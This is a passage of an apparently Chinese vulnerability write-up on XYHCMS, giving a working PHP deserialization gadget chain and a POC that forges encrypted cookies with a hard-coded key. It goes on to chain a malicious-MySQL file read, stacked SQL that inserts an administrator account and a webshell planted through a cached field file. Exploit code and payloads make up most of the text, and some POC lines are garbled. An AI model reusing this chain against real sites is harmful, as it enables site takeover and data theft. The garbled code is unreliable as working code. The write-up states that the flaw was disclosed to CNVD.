                }
getPk()代码简短，直接返回$this->pk。
    public function getPk() {
            return $this->pk;
        }
那么$pk，$this->options，$this->data均可控，此时又调用了delete()自己一次，所以等于可以带参数使用delete方法了。  
后面一系列参数都不影响代码执行，最终来到
    $result = $this->db->delete($options);
等于利用Model.class作为跳板，可以带参数执行任意类的delete方法。  
/Include/Library/Think/Db/Driver.class.php
    public function delete($options=array()) {
            $this->model  =   $options['model'];
            $this->parseBind(!empty($options['bind'])?$options['bind']:array());
            $table  =   $this->parseTable($options['table']);
            $sql    =   'DELETE FROM '.$table;
            if(strpos($table,',')){
                if(!empty($options['using'])){
                    $sql .= ' USING '.$this->parseTable($options['using']).' ';
                }
                $sql .= $this->parseJoin(!empty($options['join'])?$options['join']:'');
            }
            $sql .= $this->parseWhere(!empty($options['where'])?$options['where']:'');
            if(!strpos($table,',')){
                $sql .= $this->parseOrder(!empty($options['order'])?$options['order']:'')
                .$this->parseLimit(!empty($options['limit'])?$options['limit']:'');
            }
            $sql .=   $this->parseComment(!empty($options['comment'])?$options['comment']:'');
            return $this->execute($sql,!empty($options['fetch_sql']) ? true : false);
        }
此处在拼接$options数组中的SQL语句，最终放在$this->execute方法中执行。
    public function execute($str,$fetchSql=false) {
            $this->initConnect(true);
            if ( !$this->_linkID ) return false;
            $this->queryStr = $str;
            if(!empty($this->bind)){
                $that   =   $this;
                $this->queryStr =   strtr($this->queryStr,array_map(function($val) use($that){ return '_cf4 .$that->escapeString($val).'_cf5 ; },$this->bind));
            }
            if($fetchSql){
                return $this->queryStr;
            }
跟进$this->initConnect()
    protected function initConnect($master=true) {
            if(!empty($this->config['deploy']))
                $this->_linkID = $this->multiConnect($master);
            else
                if ( !$this->_linkID ) $this->_linkID = $this->connect();
        }
跟进$this->connect()
    public function connect($config='',$linkNum=0,$autoConnection=false) {
            if ( !isset($this->linkID[$linkNum]) ) {
                if(empty($config))  $config =   $this->config;
                try{
                    if(empty($config['dsn'])) {
                        $config['dsn']  =   $this->parseDsn($config);
                    }
                    if(version_compare(PHP_VERSION,'5.3.6','options[PDO::ATTR_EMULATE_PREPARES]  =   false;
                    }
                    $this->linkID[$linkNum] = new PDO( $config['dsn'], $config['username'], $config['password'],$this->options);
                }catch ($e) {
                    if($autoConnection){
                        trace($e->getMessage(),'','ERR');
                        return $this->connect($autoConnection,$linkNum);
                    }else{
                        E($e->getMessage());
                    }
                }
            }
            return $this->linkID[$linkNum];
        }
可以发现最终是以PDO建立数据库连接，$config 也就是$this->config可控，等于我们可以连接任意数据库，然后执行SQL语句。  
可以参考
     true
        );
        protected $config = array(
        "dsn"    => "mysql:host=localhost;dbname=xyhcms;port=3306",
        "username" => "root",
        "password" => "root"
            );
    }
    namespace Think;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;
        public function __construct(){
            $this->db = new \Think\Db\Driver\Mysql();
            $this->options['where'] = '';
            $this->pk = 'luoke';
            $this->data[$this->pk] = array(
            "table" => "xyh_admin_log",
            "where" => "id=0"
            );
        }
    }
    namespace Think\Session\Driver;
    class Memcache{
        protected $handle;
        public function __construct() {
            $this->handle = new \Think\Model();
        }
    }
    namespace Think\Image\Driver;
    class Imagick{
        private $img;
        public function __construct() {
            $this->img = new \Think\Session\Driver\Memcache();
        }
    }
    namespace Common\Lib;
    class SysCrypt{
        private $crypt_key;
        public function __construct($crypt_key) {
        $this -> crypt_key = $crypt_key;
        }
        public function php_encrypt($txt) {
        srand((double)microtime() * 1000000);
           $encrypt_key = md5(rand(0,32000));
           $ctr = 0;
           $tmp = '';
        for($i = 0;$i crypt_key));
        }
        public function php_decrypt($txt) {
        $txt = self::__key(base64_decode($txt),$this -> crypt_key);
           $tmp = '';
        for($i = 0;$i  crypt_key = null;
        }
    }
    function get_cookie($name, $key = '') {
        $key = '7q6Gw97sh';
        $key = md5($key);
        $sc = new \Common\Lib\SysCrypt($key);
        $value = $sc->php_decrypt($name);
        return unserialize($value);
    }
    function set_cookie($args, $key = '') {
        $key = '7q6Gw97sh';
        $value = serialize($args);
        $key = md5($key);
        $sc = new \Common\Lib\SysCrypt($key);
        $value = $sc->php_encrypt($value);
        return $value;
    }
    $b = new \Think\Image\Driver\Imagick();
    $a = set_cookie($b,'');
    echo str_replace('+','%2B',$a);
成功执行SQL语句，但很显然，这几乎是无危害的，因为你得知道别人数据库账户密码，或者填自己服务器的账户密码。文章中提到了利用恶意mysql服务器读取文件。  
文件读取需要绝对路径，可以猜测，也可以访问如下文件，php报错可能会爆出。  
/App/Api/Conf/config.php  
/App/Api/Controller/ApiCommonController.class.php  
/App/Common/LibTag/Other.class.php  
/App/Common/Model/ArcViewModel.class.php
得到绝对路径后，修改python脚本增加filelist为D:\xampp\htdocs\xyhcms\App\Common\Conf\db.php，修改POC数据库连接地址，成功读取配置文件。
读取到了本地的数据库之后，POC更换数据库地址，PDO默认支持堆叠，所以可以直接操作数据库。这里简单一点可以新增一个管理员上去。
    "where" => "id=0;insert into xyhcms.xyh_admin (id,username,password,encrypt,user_type,is_lock,login_num) VALUES (222,'test','88bf2f72156e8e2accc2215f7a982a83','sggFkZ',9,0,4);"
/xyhai.php?s=/Login/index  
test/123456登录  
如果需要注数据，可以尝试把数据插在一些无关紧要的地方，比如留言板。
    "where" => "id=0; update xyhcms.xyh_guestbook set content=user() where id=1;"
/index.php?s=/Guestbook/index.html
同理，权限足够也可以直接利用outfile或者general_log来getshell。
如果权限不够怎么办呢？使用序列化数据存储为php文件实在非常危险，翻翻缓存文件夹。发现数据库列的信息也以序列化形式存储在php文件当中。  
/App/Runtime/Data/_fields/xyhcms.xyh_guestbook.php
此时我们需要清理一下缓存
然后反序列化操纵mysql新增一个无关紧要的列名为  
PS：这里不能用问号，暂时不清楚原因。
    "where" => "id=0; alter table xyh_guestbook add column `` varchar(10);"
最后再访问一下前台的留言板，或者后台的留言本管理，生成缓存文件。  
/index.php?s=/Guestbook/index.html  
最终getshell  
/App/Runtime/Data/_fields/xyhcms.xyh_guestbook.php
总结一下  
1，要求php5.x版本  
2，/App/Runtime/Data/config/site.php泄露CFG_COOKIE_ENCODE  
3，制作POC，获得反序列化payload  
4，最好开放会员注册，检查/index.php?s=/Home/Public/login.html  
然后向/index.php?s=/Public/loginChk.html，/index.php?s=/Home/Member/index.html等需要cookie的接口传递paylaod。Cookie键值为uid，nickname等。  
5，访问一些php文件，通过报错获取绝对路径。  
6，通过恶意mysql服务器，读取配置文件，获取数据库信息。  
7，操作数据库。  
8，getshell
这是一个非常冗长而有意思的漏洞利用链。  
已上交CNVD-2021-05552。